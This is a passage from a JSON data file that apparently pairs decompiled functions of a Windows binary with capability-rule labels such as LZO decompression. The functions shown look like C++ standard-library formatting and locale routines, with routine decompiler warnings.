code_r0x0043ebd6;\n    }\n    if (var_2ch < uVar4) {\n        uVar4 = var_2ch;\n    }\n    fcn.004925e0(0, uVar4);\ncode_r0x0043ebd6:\n    if (var_44h != 0) {\n        fcn.004929c0(0);\n        cVar2 = fcn.0049e840(*(iVar6 + 8), *(iVar6 + 0xc), &var_48h);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.004910a0(&var_30h);\n    cVar2 = fcn.00430ce0(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004a34c0(var_48h);\n    }\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1971
    },
    "0043ef80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffb0 : 0x0043f040\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0043f937)\n// WARNING: Removing unreachable block (ram,0x0043f0ee)\n// WARNING: Removing unreachable block (ram,0x0043f0f8)\n// WARNING: Removing unreachable block (ram,0x0043f102)\n// WARNING: Removing unreachable block (ram,0x0043f810)\n// WARNING: Removing unreachable block (ram,0x0043fbb8)\n// WARNING: Removing unreachable block (ram,0x0043fbc6)\n// WARNING: Removing unreachable block (ram,0x0043f10b)\n// WARNING: Removing unreachable block (ram,0x0043f117)\n// WARNING: Removing unreachable block (ram,0x0043f8c0)\n// WARNING: Removing unreachable block (ram,0x0043f81c)\n// WARNING: Removing unreachable block (ram,0x0043f82b)\n// WARNING: Removing unreachable block (ram,0x0043f126)\n// WARNING: Removing unreachable block (ram,0x0043f12c)\n// WARNING: Removing unreachable block (ram,0x0043f090)\n// WARNING: Removing unreachable block (ram,0x0043f09a)\n// WARNING: Removing unreachable block (ram,0x0043f6f0)\n// WARNING: Removing unreachable block (ram,0x0043f09d)\n// WARNING: Removing unreachable block (ram,0x0043f0b0)\n// WARNING: Removing unreachable block (ram,0x0043f7e0)\n// WARNING: Removing unreachable block (ram,0x0043f7ee)\n// WARNING: Removing unreachable block (ram,0x0043f7fc)\n// WARNING: Removing unreachable block (ram,0x0043f0ca)\n// WARNING: Removing unreachable block (ram,0x0043f0d8)\n// WARNING: Removing unreachable block (ram,0x0043f0e0)\n// WARNING: Removing unreachable block (ram,0x0043f6c1)\n// WARNING: Removing unreachable block (ram,0x0043f6cd)\n// WARNING: Removing unreachable block (ram,0x0043f6e3)\n// WARNING: Removing unreachable block (ram,0x0043f0e2)\n// WARNING: Removing unreachable block (ram,0x0043f8d0)\n// WARNING: Removing unreachable block (ram,0x0043f8dc)\n// WARNING: Removing unreachable block (ram,0x0043f8ec)\n// WARNING: Removing unreachable block (ram,0x0043f8f4)\n// WARNING: Removing unreachable block (ram,0x0043f96e)\n// WARNING: Removing unreachable block (ram,0x0043f5c1)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.0043ef80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    ulong uVar7;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6bh;\n    uint s;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    arg_8h_00 = arg_18h + 0x6c;\n    fcn.004a0a80(arg_8h_00);\n    iVar3 = fcn.00432500();\n    piVar1 = *(*(arg_18h + 0x6c) + 0xc) + iVar3 * 4;\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        puVar5 = fcn.004a3500(0x44);\n        *puVar5 = 0x50af24;\n        puVar5[1] = 0;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x12) = 0;\n        puVar5[5] = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        puVar5[0xb] = 0;\n        puVar5[0xc] = 0;\n        puVar5[0xd] = 0;\n        *(puVar5 + 0x43) = 0;\n        fcn.0048aa30(arg_8h_00);\n        fcn.0048da50(puVar5, iVar3);\n        iVar6 = *piVar1;\n    }\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h._0_1_ = 0;\n    if (*(iVar6 + 0x10) != '\\0') {\n        fcn.004924e0(0x20);\n    }\n    var_30h = &var_28h;\n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    fcn.004924e0(0x20);\n    var_70h = 1;\n    var_4ch = *(iVar6 + 0x34);\n    puVar5 = &var_4ch;\n    while( true ) {\n        if (var_4ch < 5) {\n    // WARNING: Could not recover jumptable at 0x0043f068. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x50278c\n            uVar7 = (**(*puVar5 * 4 + 0x50278c))();\n            return uVar7;\n        }\n        if (3 < var_70h) break;\n        puVar5 = &var_4ch + var_70h;\n        var_4ch._0_1_ = *puVar5;\n        var_70h = var_70h + 1;\n    }\n    if ((var_2ch < 2) || (uVar4 = fcn.004354f0(0x30, 0),  uVar4 == 0)) goto code_r0x0043f8e6;\n    if (uVar4 == 0xffffffff) {\n        uVar4 = var_2ch - 1;\n        if (uVar4 == 0xffffffff) {\n            *var_30h = 0;\n            goto code_r0x0043f8e6;\n        }\n        if (uVar4 == 0) goto code_r0x0043f8e6;\n    }\n    if (var_2ch < uVar4) {\n        uVar4 = var_2ch;\n    }\n    fcn.004925e0(0, uVar4);\ncode_r0x0043f8e6:\n    if (var_44h != 0) {\n        fcn.004929c0(0);\n        cVar2 = fcn.0049e840(*(iVar6 + 8), *(iVar6 + 0xc), &var_48h);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.004910a0(&var_30h);\n    cVar2 = fcn.00430ce0(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004a34c0(var_48h);\n    }\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1982
    },
    "0043fee0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffb0 : 0x0043ffad\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00440810)\n// WARNING: Removing unreachable block (ram,0x0044004b)\n// WARNING: Removing unreachable block (ram,0x00440056)\n// WARNING: Removing unreachable block (ram,0x0044086f)\n// WARNING: Removing unreachable block (ram,0x00440b3a)\n// WARNING: Removing unreachable block (ram,0x0044087b)\n// WARNING: Removing unreachable block (ram,0x0044087e)\n// WARNING: Removing unreachable block (ram,0x00440888)\n// WARNING: Removing unreachable block (ram,0x00440060)\n// WARNING: Removing unreachable block (ram,0x0044006d)\n// WARNING: Removing unreachable block (ram,0x00440926)\n// WARNING: Removing unreachable block (ram,0x0044007c)\n// WARNING: Removing unreachable block (ram,0x00440082)\n// WARNING: Removing unreachable block (ram,0x0043fff8)\n// WARNING: Removing unreachable block (ram,0x00440005)\n// WARNING: Removing unreachable block (ram,0x004406af)\n// WARNING: Removing unreachable block (ram,0x0044000b)\n// WARNING: Removing unreachable block (ram,0x00440093)\n// WARNING: Removing unreachable block (ram,0x004400a9)\n// WARNING: Removing unreachable block (ram,0x00440b30)\n// WARNING: Removing unreachable block (ram,0x004400b5)\n// WARNING: Removing unreachable block (ram,0x004400b8)\n// WARNING: Removing unreachable block (ram,0x004400c4)\n// WARNING: Removing unreachable block (ram,0x00440020)\n// WARNING: Removing unreachable block (ram,0x00440780)\n// WARNING: Removing unreachable block (ram,0x00440b44)\n// WARNING: Removing unreachable block (ram,0x0044078c)\n// WARNING: Removing unreachable block (ram,0x0044078f)\n// WARNING: Removing unreachable block (ram,0x0044079b)\n// WARNING: Removing unreachable block (ram,0x0044003a)\n// WARNING: Removing unreachable block (ram,0x00440042)\n// WARNING: Removing unreachable block (ram,0x004407ac)\n// WARNING: Removing unreachable block (ram,0x004407b5)\n// WARNING: Removing unreachable block (ram,0x004407c5)\n// WARNING: Removing unreachable block (ram,0x004407cd)\n// WARNING: Removing unreachable block (ram,0x0044084a)\n// WARNING: Removing unreachable block (ram,0x004404d3)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.0043fee0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t arg_8h_00;\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_6fh;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    arg_8h_00 = arg_18h + 0x6c;\n    fcn.004a0ae0(arg_8h_00);\n    iVar3 = fcn.00432500();\n    piVar1 = *(*(arg_18h + 0x6c) + 0xc) + iVar3 * 4;\n    var_64h = *piVar1;\n    if (var_64h == 0) {\n        puVar5 = fcn.004a3500(0x54);\n        puVar5[1] = 0;\n        *puVar5 = 0x50af34;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x12) = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        puVar5[0xb] = 0;\n        puVar5[0xc] = 0;\n        puVar5[0xd] = 0;\n        puVar5[0xe] = 0;\n        *(puVar5 + 0x52) = 0;\n        fcn.0048b110(arg_8h_00);\n        fcn.0048da50(puVar5, iVar3);\n        var_64h = *piVar1;\n    }\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h._0_1_ = 0;\n    if (*(var_64h + 0x10) != '\\0') {\n        fcn.004924e0(0x20);\n    }\n    var_30h = &var_28h;\n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    fcn.004924e0(0x20);\n    var_74h = 1;\n    var_4ch = *(var_64h + 0x38);\n    puVar5 = &var_4ch;\n    while( true ) {\n        if (var_4ch < 5) {\n    // WARNING: Could not recover jumptable at 0x0043ffd1. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x502a5c\n            uVar6 = (**(*puVar5 * 4 + 0x502a5c))();\n            return uVar6;\n        }\n        if (3 < var_74h) break;\n        puVar5 = &var_4ch + var_74h;\n        var_4ch._0_1_ = *puVar5;\n        var_74h = var_74h + 1;\n    }\n    if ((var_2ch < 2) || (uVar4 = fcn.004354f0(0x30, 0),  uVar4 == 0)) goto code_r0x004407bf;\n    if (uVar4 == 0xffffffff) {\n        uVar4 = var_2ch - 1;\n        if (uVar4 == 0xffffffff) {\n            *var_30h = 0;\n            goto code_r0x004407bf;\n        }\n        if (uVar4 == 0) goto code_r0x004407bf;\n    }\n    if (var_2ch < uVar4) {\n        uVar4 = var_2ch;\n    }\n    fcn.004925e0(0, uVar4);\ncode_r0x004407bf:\n    if (var_44h != 0) {\n        fcn.004929c0(0);\n        cVar2 = fcn.0049e840(*(var_64h + 8), *(var_64h + 0xc), &var_48h);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.004910a0(&var_30h);\n    cVar2 = fcn.00430e20(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004a34c0(var_48h);\n    }\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1962
    },
    "00440c20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffb0 : 0x00440ced\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00441550)\n// WARNING: Removing unreachable block (ram,0x00440d8b)\n// WARNING: Removing unreachable block (ram,0x00440d96)\n// WARNING: Removing unreachable block (ram,0x004415af)\n// WARNING: Removing unreachable block (ram,0x0044187a)\n// WARNING: Removing unreachable block (ram,0x004415bb)\n// WARNING: Removing unreachable block (ram,0x004415be)\n// WARNING: Removing unreachable block (ram,0x004415c8)\n// WARNING: Removing unreachable block (ram,0x00440da0)\n// WARNING: Removing unreachable block (ram,0x00440dad)\n// WARNING: Removing unreachable block (ram,0x00441666)\n// WARNING: Removing unreachable block (ram,0x00440dbc)\n// WARNING: Removing unreachable block (ram,0x00440dc2)\n// WARNING: Removing unreachable block (ram,0x00440d38)\n// WARNING: Removing unreachable block (ram,0x00440d45)\n// WARNING: Removing unreachable block (ram,0x004413ef)\n// WARNING: Removing unreachable block (ram,0x00440d4b)\n// WARNING: Removing unreachable block (ram,0x00440dd3)\n// WARNING: Removing unreachable block (ram,0x00440de9)\n// WARNING: Removing unreachable block (ram,0x00441870)\n// WARNING: Removing unreachable block (ram,0x00440df5)\n// WARNING: Removing unreachable block (ram,0x00440df8)\n// WARNING: Removing unreachable block (ram,0x00440e04)\n// WARNING: Removing unreachable block (ram,0x00440d60)\n// WARNING: Removing unreachable block (ram,0x004414c0)\n// WARNING: Removing unreachable block (ram,0x00441884)\n// WARNING: Removing unreachable block (ram,0x004414cc)\n// WARNING: Removing unreachable block (ram,0x004414cf)\n// WARNING: Removing unreachable block (ram,0x004414db)\n// WARNING: Removing unreachable block (ram,0x00440d7a)\n// WARNING: Removing unreachable block (ram,0x00440d82)\n// WARNING: Removing unreachable block (ram,0x004414ec)\n// WARNING: Removing unreachable block (ram,0x004414f5)\n// WARNING: Removing unreachable block (ram,0x00441505)\n// WARNING: Removing unreachable block (ram,0x0044150d)\n// WARNING: Removing unreachable block (ram,0x0044158a)\n// WARNING: Removing unreachable block (ram,0x00441213)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.00440c20(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t arg_8h_00;\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_6fh;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    arg_8h_00 = arg_18h + 0x6c;\n    fcn.004a0ae0(arg_8h_00);\n    iVar3 = fcn.00432500();\n    piVar1 = *(*(arg_18h + 0x6c) + 0xc) + iVar3 * 4;\n    var_64h = *piVar1;\n    if (var_64h == 0) {\n        puVar5 = fcn.004a3500(0x54);\n        puVar5[1] = 0;\n        *puVar5 = 0x50af44;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x12) = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        puVar5[0xb] = 0;\n        puVar5[0xc] = 0;\n        puVar5[0xd] = 0;\n        puVar5[0xe] = 0;\n        *(puVar5 + 0x52) = 0;\n        fcn.0048b930(arg_8h_00);\n        fcn.0048da50(puVar5, iVar3);\n        var_64h = *piVar1;\n    }\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h._0_1_ = 0;\n    if (*(var_64h + 0x10) != '\\0') {\n        fcn.004924e0(0x20);\n    }\n    var_30h = &var_28h;\n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    fcn.004924e0(0x20);\n    var_74h = 1;\n    var_4ch = *(var_64h + 0x38);\n    puVar5 = &var_4ch;\n    while( true ) {\n        if (var_4ch < 5) {\n    // WARNING: Could not recover jumptable at 0x00440d11. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x502a48\n            uVar6 = (**(*puVar5 * 4 + 0x502a48))();\n            return uVar6;\n        }\n        if (3 < var_74h) break;\n        puVar5 = &var_4ch + var_74h;\n        var_4ch._0_1_ = *puVar5;\n        var_74h = var_74h + 1;\n    }\n    if ((var_2ch < 2) || (uVar4 = fcn.004354f0(0x30, 0),  uVar4 == 0)) goto code_r0x004414ff;\n    if (uVar4 == 0xffffffff) {\n        uVar4 = var_2ch - 1;\n        if (uVar4 == 0xffffffff) {\n            *var_30h = 0;\n            goto code_r0x004414ff;\n        }\n        if (uVar4 == 0) goto code_r0x004414ff;\n    }\n    if (var_2ch < uVar4) {\n        uVar4 = var_2ch;\n    }\n    fcn.004925e0(0, uVar4);\ncode_r0x004414ff:\n    if (var_44h != 0) {\n        fcn.004929c0(0);\n        cVar2 = fcn.0049e840(*(var_64h + 8), *(var_64h + 0xc), &var_48h);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.004910a0(&var_30h);\n    cVar2 = fcn.00430e20(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004a34c0(var_48h);\n    }\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1959
    },
    "00441c20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.00441c20(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    unkbyte10 in_stack_00000018;\n    uint uStack132;\n    uint *puStack128;\n    uint32_t auStack124 [4];\n    unkbyte10 aStack108 [2];\n    uint *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint *var_30h;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_48h = arg_10h;\n    var_4ch = arg_18h;\n    auStack124[0] = arg_14h + 0x6c;\n    puStack128 = 0x441c49;\n    fcn.0048f500();\n    puStack128 = &fcn.00441c20::var_34h;\n    uStack132 = 0x441c57;\n    piVar3 = fcn.004a0a80();\n    uStack132 = 0x441c63;\n    iVar4 = fcn.00418950();\n    iVar4 = -iVar4;\n    piVar7 = &stack0xffffff80 + iVar4;\n    uVar6 = &fcn.00441c20::var_50h + iVar4 + 3 & 0xfffffff0;\n    var_40h = uVar6;\n    *(&stack0xffffff7c + iVar4) = 0x441c74;\n    var_30h = fcn.0048f260();\n    *(&stack0xffffff90 + iVar4) = 0;\n    *(&stack0xffffff8c + iVar4) = 0x502688;\n    *(&stack0xffffff88 + iVar4) = 0x40;\n    *(&stack0xffffff94 + iVar4) = in_stack_00000018;\n    *(&stack0xffffff84 + iVar4) = uVar6;\n    *(&stack0xffffff80 + iVar4) = &fcn.00441c20::var_30h;\n    *(&stack0xffffff7c + iVar4) = 0x441ca5;\n    iVar5 = fcn.0049df90();\n    if (0x3f < iVar5) {\n        var_50h = iVar5 + 1;\n        *(&stack0xffffff7c + iVar4) = 0x441cc0;\n        iVar5 = fcn.00418950();\n        iVar5 = -iVar5;\n        piVar7 = &stack0xffffff80 + iVar5 + iVar4;\n        uVar6 = &fcn.00441c20::var_50h + iVar5 + iVar4 + 3 & 0xfffffff0;\n        var_40h = uVar6;\n        *(&stack0xffffff7c + iVar5 + iVar4) = 0x441cd1;\n        var_30h = fcn.0048f260();\n        iVar2 = var_50h;\n        *(&stack0xffffff90 + iVar5 + iVar4) = 0;\n        *(&stack0xffffff8c + iVar5 + iVar4) = 0x502688;\n        *(&stack0xffffff94 + iVar5 + iVar4) = in_stack_00000018;\n        *(&stack0xffffff88 + iVar5 + iVar4) = iVar2;\n        *(&stack0xffffff84 + iVar5 + iVar4) = uVar6;\n        *(&stack0xffffff80 + iVar5 + iVar4) = &fcn.00441c20::var_30h;\n        *(&stack0xffffff7c + iVar5 + iVar4) = 0x441cfe;\n        iVar5 = fcn.0049df90();\n    }\n    piVar7[1] = 0;\n    *piVar7 = iVar5;\n    var_30h = &fcn.00441c20::var_28h;\n    piVar7[-1] = 0x441d18;\n    fcn.00490a40();\n    piVar9 = piVar7 + -2;\n    var_50h = var_30h;\n    if (*(piVar3 + 7) != '\\x01') {\n        if (*(piVar3 + 7) == '\\0') {\n            piVar7[-3] = 0x441dd7;\n            fcn.00431cc0();\n            pcVar1 = *(*piVar3 + 0x1c);\n        }\n        else {\n            pcVar1 = *(*piVar3 + 0x1c);\n        }\n        if (pcVar1 != 0x431f40) {\n            *piVar7 = var_50h;\n            iVar5 = iVar5 + var_40h;\n            piVar7[-2] = var_40h;\n            piVar7[-1] = iVar5;\n            piVar8 = piVar7 + -3;\n            piVar7[-3] = 0x441dfe;\n            (*pcVar1)();\n            piVar9 = piVar8 + -0xc;\n            goto code_r0x00441d57;\n        }\n    }\n    uVar6 = var_40h;\n    *piVar7 = iVar5;\n    piVar7[-1] = uVar6;\n    piVar7[-2] = var_50h;\n    piVar7[-3] = 0x441d57;\n    sub.msvcrt.dll_memcpy();\ncode_r0x00441d57:\n    piVar9[4] = &fcn.00441c20::var_30h;\n    piVar9[3] = var_4ch;\n    piVar9[1] = arg_ch;\n    piVar9[2] = arg_14h;\n    *piVar9 = arg_8h;\n    if (var_48h == '\\0') {\n        piVar9[-1] = 0x441dc9;\n        _var_40h = fcn.00441e30(*piVar9, piVar9[1], piVar9[2], piVar9[3], piVar9[4]);\n    }\n    else {\n        piVar9[-1] = 0x441d85;\n        _var_40h = fcn.004425b0(*piVar9, piVar9[1], piVar9[2], piVar9[3], piVar9[4]);\n    }\n    if (var_30h != &fcn.00441c20::var_28h) {\n        piVar9[-5] = var_30h;\n        var_40h = _var_40h;\n        var_3ch = _var_40h >> 0x20;\n        piVar9[-6] = 0x441da0;\n        fcn.004a34c0();\n    }\n    var_40h = _var_40h;\n    var_3ch = _var_40h >> 0x20;\n    piVar9[-6] = 0x441db4;\n    fcn.0048f620();\n    return _var_40h;\n}\n",
        "token_count": 1706
    },
    "00441e30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00441e30(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint8_t **arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t **ppiVar2;\n    uchar uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uchar *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    uint8_t *puVar11;\n    bool bVar12;\n    int32_t *piVar13;\n    uint8_t *puVar14;\n    uint *puVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    char *var_7ch;\n    uint var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint var_6ch;\n    uint8_t var_65h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    var_64h = arg_ch;\n    var_65h = arg_ch;\n    iVar4 = fcn.004a0a80(arg_10h + 0x6c);\n    iVar5 = fcn.00432500();\n    ppiVar2 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    piVar13 = *ppiVar2;\n    if (piVar13 == NULL) {\n        puVar15 = fcn.004a3500(0x44);\n        *puVar15 = 0x50af14;\n        *(puVar15 + 4) = 0;\n        puVar15[1] = 0;\n        puVar15[2] = 0;\n        puVar15[3] = 0;\n        *(puVar15 + 0x12) = 0;\n        puVar15[5] = 0;\n        puVar15[6] = 0;\n        puVar15[7] = 0;\n        puVar15[8] = 0;\n        puVar15[9] = 0;\n        puVar15[10] = 0;\n        puVar15[0xb] = 0;\n        puVar15[0xc] = 0;\n        puVar15[0xd] = 0;\n        *(puVar15 + 0x43) = 0;\n        fcn.0048a350(arg_10h + 0x6c);\n        fcn.0048da50(puVar15, iVar5);\n        piVar13 = *ppiVar2;\n    }\n    puVar14 = *arg_18h;\n    if (*puVar14 == *(piVar13 + 0xe)) {\n        var_4ch = piVar13[0xd];\n        if (arg_18h[1] == NULL) goto code_r0x00441ee6;\n        var_7ch = piVar13[9];\n        puVar14 = puVar14 + 1;\n        var_74h = piVar13[10];\n    }\n    else {\n        var_4ch = piVar13[0xc];\n        var_7ch = piVar13[7];\n        var_74h = piVar13[8];\n    }\n    puVar11 = arg_18h[1] + puVar14;\n    if ((puVar11 <= puVar14) || (puVar6 = puVar14,  (*(*(iVar4 + 0x18) + *puVar14 * 2) & 8) == 0))\n    goto code_r0x00441ee6;\n    do {\n        puVar6 = puVar6 + 1;\n        if (puVar11 == puVar6) {\n            uVar16 = puVar11 - puVar14;\n            goto joined_r0x00441f16;\n        }\n    } while ((*(*(iVar4 + 0x18) + *puVar6 * 2) & 8) != 0);\n    uVar16 = puVar6 - puVar14;\njoined_r0x00441f16:\n    if (uVar16 == 0) goto code_r0x00441ee6;\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h = var_40h & 0xffffff00;\n    fcn.004924e0(uVar16 * 2);\n    iVar4 = piVar13[0xb];\n    var_70h = uVar16 - iVar4;\n    if (var_70h < 1) {\ncode_r0x00441fd1:\n        uVar17 = var_44h;\n        if (iVar4 < 1) {\ncode_r0x00441fdf:\n            uVar17 = var_44h + var_74h;\n            uVar16 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar17 = uVar17 + piVar13[6];\n            }\n            var_30h = &var_28h;\n            var_2ch = 0;\n            var_28h = var_28h & 0xffffff00;\n            fcn.004924e0(uVar17 * 2);\n            puVar15 = &var_4ch;\n            var_70h = *(arg_10h + 8);\n            bVar12 = uVar16 == 0x10 && uVar17 < var_70h;\n            do {\n                uVar1 = var_2ch;\n                if (*puVar15 < 5) {\n    // switch table (5 cases) at 0x502674\n                    switch(*puVar15) {\n                    case 0:\n                        if (bVar12) {\n                            fcn.00490f00(var_2ch, 0, var_70h - uVar17, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar12) {\n                            fcn.00490f00(var_2ch, 0, var_70h - uVar17, arg_14h);\n                        }\n                        else {\n                            uVar8 = var_2ch + 1;\n                            uVar9 = 0xf;\n                            if (var_30h != &var_28h) {\n                                uVar9 = var_28h;\n                            }\n                            if (uVar9 < uVar8) {\n                                fcn.00492830(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar1) = arg_14h;\n                            *(var_30h + uVar1 + 1) = 0;\n                            var_2ch = uVar8;\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            if (0x7fffffff - var_2ch < piVar13[6]) goto code_r0x0044252c;\n                            fcn.00492660(piVar13[5], piVar13[6]);\n                        }\n                        break;\n                    case 3:\n                        if (var_74h != 0) {\n                            fcn.004929c0(*var_7ch);\n                        }\n                        break;\n                    case 4:\n                        fcn.00492660(var_48h, var_44h);\n                    }\n                }\n                puVar15 = puVar15 + 1;\n            } while (&var_48h != puVar15);\n            if (var_74h < 2) {\n                if (var_2ch < var_70h) goto code_r0x00442211;\ncode_r0x004421ac:\n                var_70h = var_2ch;\n            }\n            else {\n                piVar13 = 0x7fffffff - var_2ch;\n                if (piVar13 < var_74h - 1) goto code_r0x00442504;\n                fcn.00492660(var_7ch + 1, var_74h - 1);\n                if (var_70h <= var_2ch) goto code_r0x004421ac;\ncode_r0x00442211:\n                if (uVar16 == 0x20) {\n                    fcn.00490f00(var_2ch, 0, var_70h - var_2ch, arg_14h);\n                }\n                else {\n                    fcn.00490f00(0, 0, 